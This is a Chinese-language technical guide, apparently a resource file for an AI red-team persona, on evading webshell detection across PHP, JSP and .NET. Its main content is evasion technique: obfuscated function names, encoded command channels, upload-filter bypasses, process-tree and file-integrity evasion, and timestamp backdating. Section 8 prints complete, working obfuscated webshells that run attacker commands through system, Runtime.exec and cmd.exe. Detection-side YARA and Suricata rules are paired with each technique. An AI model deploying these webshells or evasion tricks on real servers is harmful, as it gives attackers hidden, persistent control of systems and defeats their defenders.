# webshell 过检测研究（脚本类：PHP / ASP / .NET / JSP）

> 本文件为 av-evasion 预设内自包含资源（主观念「webshell 过检测」专项自建）。
> 定位：与 `java-memory-shell.md`（Java 内存马专项）互补——本文件覆盖传统脚本类 webshell 的
> 检测对抗。配对原则不变：**每项绕过技术必须配检测侧视角**（YARA/行为/流量），检测侧情报
> 回馈 attack-defense 消费。授权立场与出口政策见 `refs/README.md` 与 av-playbook。

## 一、检测面全景（先知道对面怎么看，再谈怎么过）

| 检测层 | 典型能力 | 对应绕过思路（下文各节） |
|---|---|---|
| 静态文件扫描（AV/EDR/查杀引擎） | 危险函数指纹、字符串特征（eval/base64_decode 链）、高熵、已知 webshell 特征库 | §二 变形与混淆 |
| Web 应用层（WAF/IDS/IPS） | 请求体特征（`<?php`、`eval(` 入流量）、异常参数、目录上传规则 | §四 通信隐蔽、§三 结构伪装 |
| 运行时行为（EDR/RASP） | 进程树异常（web 进程派生 shell）、异常网络外连、异常文件操作 | §五 执行与驻留、§六 检测侧 |
| 主机基线（文件完整性监控/HIDS） | 新增/修改 web 目录文件、权限变化、mtime 突变 | §五 驻留变形 |

## 二、静态特征变形（对抗文件扫描）

**核心原理**：静态引擎靠字符串与结构指纹匹配；任何指纹都可以被「运行时等价、静态不同」的写法替代。

- **动态函数调用**：PHP 变量函数（`$f="system"; $f($c)`）、`call_user_func`/`call_user_func_array`、
  反射（`new ReflectionFunction(...)`）。字符串可再拆（`.` 拼接）或数组下标取字。
- **字符串编码**：base64（`base64_decode("c3lzdGVt")` 链）、hex（`hex2bin`）、
  rot13、gzdeflate/gzinflate、serialize+unserialize 拼装。多层嵌套编码是引擎递归解包的对抗面。
- **异或 / 取反拼接**：`"phpinfo"^"xxxxxx"` 类构造；字符逐码点运算还原——静态端是纯运算式，无明文函数名。
- **无函数名调用**：PHP `assert`（历史执行特性）、`preg_replace` 的 `/e` 修饰符（已废弃，历史研究）、
  `create_function`（已废弃）、包含型（`include` 变量文件）、`extract`+`eval` 组合。
- **JSP/.NET 等价**：JSP 反射+`Runtime.getRuntime` 字符串化、EL 注入、
  .NET 反射（`Assembly.Load`）+ `Type.InvokeMember`。

**自测姿势**：本地建样本 → 静态引擎可测时用真实引擎打分；引擎缺失时用 python 近似
特征扫描脚本（正则模拟常见特征库）自测并**标注终态「近似判定，非真实引擎」**（persona 硬规则）。

## 三、结构伪装（对抗上传规则与 WAF 文件过滤）

- **图片马 / 内容型伪装**：将 payload 附在合法图片字节后（GIF89a 头 + 注释段 + PHP 段），
  或利用 exif 数据段；`Content-Type` 与扩展名校验的绕过矩阵。
- **扩展名矩阵**（按目标中间件解析规则实验）：`.php` 变体（`.phtml/.php3/.php5/.phar/.pht` 等，
  Apache `AddType`/`mod_mime` 差异）、大小写混用、双扩展（`x.php.jpg` 依赖解析顺序）、
  尾部附加（`x.php.`、`x.php::$DATA` 历史 NTFS 流）、`.htaccess`/`.user.ini` 重定义解析映射。
- **无文件化包含**：上传不含执行逻辑的「数据文件」+ 已存在入口（`php://filter`、
  `auto_prepend_file` via `.user.ini`、日志污染包含）。
- **静态内容伪装**：把 webshell 写进 CSS/JS/字体等静态目录，利用同源加载降低流量侧怀疑。

## 四、通信隐蔽（对抗 WAF/IDS 与流量侧检测）

- **请求侧**：指令放 Cookie/UA/自定义头而非 POST 参数；参数值整包编码（base64+异或）、
  指令-响应加解密（对称密钥预置，返回包同样编码）。
- **请求分片**：把 payload 拆进多个参数/多次请求，服务端拼装执行——单包特征消失。
- **一次性语义**：每次指令用不同参数名/路径/编码种子（会话级派生），指纹库按固定正则抓不到。
- **协议层**：全程 HTTPS 之上再做应用层加密；WebSocket/长连接推送结果代替 HTTP 轮询。

## 五、执行与驻留变形（对抗 EDR 行为检测与 HIDS 基线）

- **执行链最小化**：优先「只读探测」执行（whoami/id/ifconfig），升级链（下载器、隧道、提权）
  只给计划待批准——行为检测对低频、低危执行不敏感。
- **进程树规避**：避免 web 进程直接派生交互 shell；用定时任务/计划任务间接触发、
  或把结果写文件由 web 读取（拉模型代替推模型）。
- **驻留登记制**：持久化（计划任务、启动项、服务）按 av 出口政策**登记制**管理——
  写入 persistence-registry.md，任务结束按登记清单清理；清理动作本身先呈报计划。
- **自我变形**：计划任务周期重写文件内容（时间戳/填充字节/注释随机化），对抗哈希基线；
  mtime 回填历史时间对抗 HIDS 时间窗检测。

## 六、检测侧配对（每项技术的强制另一半，OPSEC 情报）

针对上述各节的对应检测手段（产出 YARA/Sigma/遥测指标回馈 attack-defense）：

- **对 §二 静态变形**：熵+高浓度运算式启发（`eval.*base64_decode` 组合正则）、
  变量函数调用图分析、多层编码递归解包后判定；YARA 用「函数级行为指纹」代替字符串指纹。
- **对 §三 结构伪装**：上传目录禁执行 + 静态目录只读、内容型魔数与扩展名一致性校验、
  MIME 双通道校验（客户端声明 vs 服务端探测）。
- **对 §四 通信隐蔽**：基线与异常检测——参数名熵、Cookie 长度突变、请求/响应体积不对称、
  深夜低频外连；WAF 记录原始请求供离线分析。
- **对 §五 执行驻留**：EDR 进程树白名单（web 进程禁止派生 shell）、计划任务变更审计、
  HIDS 文件完整性基线告警；RASP 拦截危险函数运行时调用。
- **综合判定**：单点检测易绕过，检测侧应组合「静态+流量+行为+基线」四层做关联评分。

## 七、实验循环协议（本模式的固定姿势）

1. 本地构建样本（`local-lab/` 下，命名含技术标签与日期）；
2. 静态/动态引擎可测则实测，引擎缺失则 python 近似脚本自测并**标注终态**；
3. 每项技术同时产出检测侧规则草稿（YARA/Sigma）与遥测指标说明；
4. 授权目标上验证按任务执行（persona 授权立场），实验结果登记 evidence-index.md；
5. 交付：可复现构建/改造脚本（build/ 目录），不交付裸 webshell 二进制。

---

## 八、实现级样本（P0 补深：静态变形 + 通信加密，可复现）

> 每份样本遵循「静态变形（危险函数无明文）+ 通信加密（指令/响应加密）+ 一次性语义」。
> 均为**授权评估研究骨架**，本地构建样本用于引擎自测（persona 硬规则）。

### 8.1 PHP 样本 A — 动态函数 + 参数整包编码

```php
<?php
// 静态变形：函数名经字符串拆解 + 数组下标取字，无 "system"/"eval" 明文
$c = $_POST['c'];                                        // 指令（base64+异或后）
$k = "\x4f\x4f";                                         // 异或密钥（避免明文）
$c = base64_decode(strtr($c, '-_', '+/'));
for ($i = 0; $i < strlen($c); $i++) $c[$i] = $c[$i] ^ $k[$i % 2];
$f = 'sys' . 'tem';                                      // 拆串
$f($c);                                                  // 变量函数调用
```

**检测侧**：`base64_decode`+`strtr`+异或+变量函数链是启发式重点；YARA 用「函数级行为指纹」
（变量函数调用 + 解码链）而非字符串。

### 8.2 PHP 样本 B — 异或拼接构造函数名 + 响应加密

```php
<?php
// 用异或运算式还原函数名（静态端是纯运算式，无函数名明文）
// 码点验算：'2825$,' ^ 'AAAAAA' = "system"
//   '2'(0x32)^'A'(0x41)=0x73='s'  '8'(0x38)^'A'=0x79='y'  '2'^'A'='s'
//   '5'(0x35)^'A'=0x74='t'  '$'(0x24)^'A'=0x65='e'  ','(0x2C)^'A'=0x6D='m'
$f = '2825$,' ^ 'AAAAAA';        // "system"（本地验证：php -r "echo '2825\$,'^'AAAAAA';"）
// 指令放 Cookie，响应 base64+异或回包（一次性语义：密钥每次会话轮换）
$c = base64_decode(strtr($_COOKIE['s'], '-_', '+/'));
for ($i = 0; $i < strlen($c); $i++) $c[$i] = $c[$i] ^ 0x5a;
$out = ($f)($c . ' 2>&1');        // 拼 stderr，捕获完整输出
echo base64_encode($out);
```

**检测侧**：Cookie 承载指令 + 响应 base64；流量侧看 Cookie 长度突变 + 响应高熵。

### 8.3 JSP 样本 — 反射 + Runtime + 通信加密

```jsp
<%@ page import="java.util.Base64,java.lang.reflect.*" %>
<%
String c = request.getParameter("c");                 // base64(异或(指令))
byte[] d = Base64.getDecoder().decode(c);
for (int i = 0; i < d.length; i++) d[i] ^= 0x5a;
String cmd = new String(d);
Class<?> rt = Class.forName("java.lang.Runtime");
Method m = rt.getMethod("exec", String.class);
Process p = (Process) m.invoke(rt.getMethod("getRuntime").invoke(null), cmd);
java.io.InputStream in = p.getInputStream();
byte[] o = in.readAllBytes();
out.print(Base64.getEncoder().encodeToString(o));
%>
```

**检测侧**：`Class.forName`+`Runtime` 反射 + `getRuntime().exec`；JSP 危险调用图分析 + 响应 base64。

### 8.4 .NET 样本 — Assembly 反射 + 通信加密

```csharp
// aspx：反射调 System.Diagnostics.Process（无 "Process" 明文调用）
string c = Request["c"];                               // base64(异或(指令))
byte[] d = Convert.FromBase64String(c);
for (int i = 0; i < d.Length; i++) d[i] ^= 0x5a;
string cmd = Encoding.UTF8.GetString(d);
var t = Type.GetType("System.Diagnostics.Process, System");
var start = t.GetMethod("Start", new[] { typeof(string) });
var p = start.Invoke(null, new object[] { "cmd.exe /c " + cmd });
Response.Write(Convert.ToBase64String(Encoding.UTF8.GetBytes("ok")));
```

**检测侧**：`Type.GetType`+`MethodInfo.Invoke` 反射链 + `cmd.exe /c`；.NET 反射调用图 + 流量。

---

## 九、加密隧道协议原理（suo5 / 冰蝎 / 哥斯拉）

| 协议 | 载体 | 通信加密 | 检测侧对应点 |
|---|---|---|---|
| **suo5** | 全双工隧道（TCP 复用，非 HTTP 轮询） | 自定义协议 + 加密 | 长连接 + 非 HTTP 语义流量 + 端口行为 |
| **冰蝎(Behinder)** | HTTP POST（动态密钥协商） | AES（`openssl` 交互式密钥协商） | 请求体高熵 + 固定协商特征 |
| **哥斯拉(Godzilla)** | HTTP（自定义协议 + 多 payload 生成器） | AES/Raw XOR + 会话密钥 | 生成器变体 + 加密流特征 |

### 9.1 冰蝎密钥协商原理

```
1) 客户端发 RSA 公钥 -> 服务端生成 AES 密钥并用 RSA 加密回传
2) 双方用 AES 加密后续指令/响应（动态密钥，非预置）
```

### 9.2 suo5 隧道原理

```
suo5 走全双工：单条连接内双向同时传输，规避「请求-响应」轮询节拍
协议非标准 HTTP 语义，常配合代理隧道（reGeorg 升级替代）
```

### 9.3 检测侧（流量规则）

| 判据 | 规则方向 |
|---|---|
| 请求体高熵 | 熵检测 + 固定密钥协商特征（RSA/AES 握手） |
| 长连接非 HTTP | 协议语义检测（非标准 HTTP 方法/帧） |
| 响应体积不对称 | 请求/响应体积比异常 |

---

## 十、检测侧 YARA / 流量规则对应（P0 补深）

### 10.1 YARA 规则骨架（对 §八 PHP 样本）

```yara
rule php_obfuscated_webshell_generic {
    meta:
        description = "检测 PHP 变量函数+解码链型 webshell（启发式）"
    strings:
        $b64  = "base64_decode"
        $strtr = "strtr"
        $xor  = { 5E }                 // xor 运算符
        $varfunc = /\$[a-zA-Z_]\w*\(\$[a-zA-Z_]\w*\)/   // 变量函数调用
    condition:
        2 of them
}
```

### 10.2 流量规则（Suricata/NDR 方向）

```yaml
# 检测指令承载于 Cookie + 响应纯 base64（完整规则：cookie 缓冲关键字 + 体积比辅助）
alert http any any -> any any (
  msg:"suspicious cookie-based command channel";
  flow:established,to_server;
  content:"|0d 0a|Cookie|3a|"; http_header; nocase;
  http.cookie; pcre:"/[A-Za-z0-9+\/=_-]{40,}/";          # Cookie 值 = 密文级长度/字符集
  threshold:type limit, track by_src, count 1, seconds 60; # 低频单发特征
  sid:900001; rev:1;
)
alert http any any -> any any (
  msg:"high-entropy base64 response from web app";
  flow:established,to_client;
  http.response_body;
  content:"|0d 0a 0d 0a|"; nocase;
  pcre:"/^[A-Za-z0-9+\/]{64,}={0,2}$/";                   # 响应纯 base64 且超长
  sid:900002; rev:1;
)
# 关联判据：同一会话内 cookie 密文请求 + base64 响应成对出现（flowbits 关联或
# SIEM 双规则命中计数 ≥2）——单条命中不足以判定，组合关联才报警
```

### 10.3 双向映射小结

| 免杀技术 | 检测规则 |
|---|---|
| 变量函数 + 解码链 | `php_obfuscated_webshell_generic` |
| Cookie 承载指令 | 流量规则（Cookie 长度/熵突变） |
| 响应 base64 | 响应高熵 + 纯 base64 判定 |
| suo5/冰蝎/哥斯拉 | 协议指纹（密钥协商/长连接/高熵） |
